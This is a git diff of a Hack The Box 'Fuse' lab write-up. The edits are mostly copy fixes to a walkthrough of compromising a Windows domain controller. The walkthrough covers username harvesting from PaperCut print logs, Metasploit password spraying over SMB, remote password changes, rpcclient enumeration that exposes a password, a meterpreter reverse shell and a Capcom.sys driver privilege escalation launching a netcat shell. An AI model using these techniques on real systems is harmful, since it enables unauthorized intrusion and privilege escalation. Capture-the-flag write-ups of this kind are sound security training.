@@ -100,13 +100,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 410.91 seconds
 ```
 
-many many ports open. From the ports and services open this appears to be a domain controller running windows server 2016
-
-navigating to port 80 redirects to [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm), added fuse.fabricorp.local to hosts
+This machine had many ports open. From the ports and services that were open this appeared to be a domain controller running Windows Server 2016.
 
 ![](../../.gitbook/assets/1-papercut.png)
 
-I clicked on view HTML for each of the print history pages
+Navigating to port 80 redirected me to [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm).  I had to add `fuse.fabricorp.local` to my local hosts file to proceed.  I was greeted by a PaperCut print logger site, without any authentication protecting it. I clicked on view HTML for each of the print history pages to see what kind of documents had been printed recently.
 
 ![](../../.gitbook/assets/1-29may.png)
 
@@ -114,7 +112,7 @@ I clicked on view HTML for each of the print history pages
 
 ![](../../.gitbook/assets/1-10jun.png)
 
-potential usernames in the print history pages
+Each of the three pages contained potential usernames and client computer names in the print history and a number of interesting sounding document titles.
 
 ```text
 Time        User        Pages    Copies    Printer        Document                        Client    Duplex    Grayscale
@@ -165,18 +163,18 @@ Unfortunately these users all had Kerberos pre-authentication enabled, but I was
 
 ![](../../.gitbook/assets/1-papercut-about.png)
 
-At first I started chasing the little white rabbit while doing research about this Papercut service.  
+At first I started chasing the little white rabbit while doing research about this PaperCut service.  
 
 ![](../../.gitbook/assets/5-deleted-files.png)
 
-I managed to find some interesting results that looked like a potential way to retrieve printed documents through backups, but I either did not have the proper privileges, or these options were not active on this site. 
+I managed to find some interesting results that looked like a potential way to retrieve printed documents through backups, but either I did not have the proper privileges, or these options were not active on this site. 
 
 * [https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData\#restore-from-a-backup-on-to-a-test-server](https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData#restore-from-a-backup-on-to-a-test-server)
 * [https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html](https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html)
 * \[app-path\]\server\data\backups
 * [https://nvd.nist.gov/vuln/detail/CVE-2019-8948](https://nvd.nist.gov/vuln/detail/CVE-2019-8948)
 
-After exhausting those possibilities, I went back and tried to do a good ol' brute force enumeration using the valid usernames I had found and my potential password I had spotted.
+After exhausting those possibilities, I went back and tried to do a good ol' brute force enumeration using the valid usernames I had found and the potential password I had spotted.
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > search type:auxiliary smb
@@ -243,7 +241,7 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 [*] Auxiliary module execution completed
 ```
 
-After running the `smb_login` scanner I found that not only one person had used this as their password, but three people had!
+After running the `smb_login` scanner I found that not only had one person used this as their password, but three people had!
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
@@ -262,7 +260,7 @@ Enter FABRICORP\bhult's password:
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 ```
 
-However, I got an interesting error back when trying to enumerate open shares for these three users: `NT_STATUS_PASSWORD_MUST_CHANGE`.  I looked this up and found out that this meant that the user's passwords had expired and would have to be changed before they could log in.  Next, I did some research on changing SMB login passwords remotely from a Linix command line.
+However, I got an interesting error back when trying to enumerate open shares for these three users: `NT_STATUS_PASSWORD_MUST_CHANGE`.  I looked this up and found out that this meant that the user's passwords had expired and would have to be changed before they could log in.  Next, I did some research on changing SMB login passwords remotely from a Linux command line.
 
 [https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password)
 
@@ -301,7 +299,7 @@ machine 10.10.10.193 rejected the password change: Error was : When trying to up
 I used this to try to change the password for `bnielson`, but it seemed as if there were some sort of password complexity rules in place. 
 
 {% hint style="info" %}
-The passwords will not show up on the screen like in my output above.  I added them to illustrate what I had done since the two code output boxes were identical without them!
+The passwords will not show up on the screen like in my output above and below.  I added them to illustrate what I had done since the two code output boxes were identical without them!
 {% endhint %}
 
 ```text
@@ -314,6 +312,10 @@ Password changed for user bnielson
 ```
 
 After choosing a more complex password, I was able to change it successfully.
+
+{% hint style="info" %}
+If you change a user's password, and find that after a minute or so that your password isn't working, this is intended by the machine creator.  Especially on the free servers there may be a lot of people trying to exploit the machine at the same time, so this saves the trouble of a million machine resets. \(But it is still annoying if you don't know what's going on!\)
+{% endhint %}
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
@@ -397,10 +399,6 @@ SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
 rpcclient $> lsaaddacctrights
 Usage: lsaaddacctrights SID [rights...]
 rpcclient $> lsaaddacctrights 0x451 SeDebugPrivilege
-result was NT_STATUS_NONE_MAPPED
-rpcclient $> lsaaddacctrights 0x451 0x14
-result was NT_STATUS_NONE_MAPPED
-rpcclient $> lsaaddacctrights 0x451 0x0:0x14
 result was NT_STATUS_NONE_MAPPED
 
 rpcclient $> srvinfo
@@ -549,7 +547,7 @@ rpcclient $> enumprinters
         comment:[]
 ```
 
-After enumerating RPC with `rpcclient` for awhile and finding a bunch of useful information, I hit the jackpot when checking for printers. In the description field someone had left a helpful note telling users where the printer was located, and also what the password was!
+After enumerating the machine through RPC with `rpcclient` for awhile and finding a bunch of useful information, I hit the jackpot when checking for printers. In the description field someone had left a helpful note telling users where the printer was located, and also what the password was!
 
 ```text
 msf5 auxiliary(scanner/smb/smb_login) > run
@@ -877,7 +875,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
     663      26    52092      66048       0.47   4000   0 wsmprovhost
 
 
-*Evil-WinRM* PS C:\Users\svc-print\Documents> stop-process -name print
+*Evil-WinRM* PS C:\Users\svc-print\Documents> Stop-Process -Name print
 ```
 
 First I tried to see if I could get a meterpreter shell by uploading a reverse shell I created using msfvenom.  I uploaded my malicious `print.exe`, ran it, and was given a meterpreter shell.  I backgrounded my shell to try to use the exploit `windows/local/capcom_sys_exec` which was related to the exploit in the article. 
@@ -944,7 +942,7 @@ Going back to the article I found earlier, I found a few links to files needed f
 
 ![](../../.gitbook/assets/exploit-capcom.png)
 
-Following the instructions, I had to compile the two files on Windows \(with a matching x64 architecture,.  I customized the exploit a bit to have it call a simple .bat script I wrote to send me a netcat reverse shell. The four files needed for this to work were:
+Following the instructions, I had to compile the two files on Windows \(with a matching x64 architecture\).  I customized the exploit a bit to have it call a simple .bat script I wrote to send me a netcat reverse shell. The four files needed for this to work were:
 
 1. Capcom.sys
 2. EOPLOADDRIVER.exe
@@ -1090,6 +1088,10 @@ c:\Users\Administrator\Desktop>type root.txt
 type root.txt
 995555f7516045d9982eafbe2b0d6944
 ```
+
+{% hint style="info" %}
+I didn't remember this until after I was doing my write-up, but I totally forgot to finish exploiting this machine.  I had found out while enumerating through RPC that the user **`sthompson`** was a Domain Administrator, so this should have been my end goal.  If you get this far, try to see if you can go for the king of the hill and fully compromise this \(non-existent\) domain!
+{% endhint %}
 
 Thanks to [`egre55`](https://app.hackthebox.eu/users/1190) for creating this fairly easy but interesting machine.  It is always nice to encounter challenges that introduce new privileges to take advantage of!
 
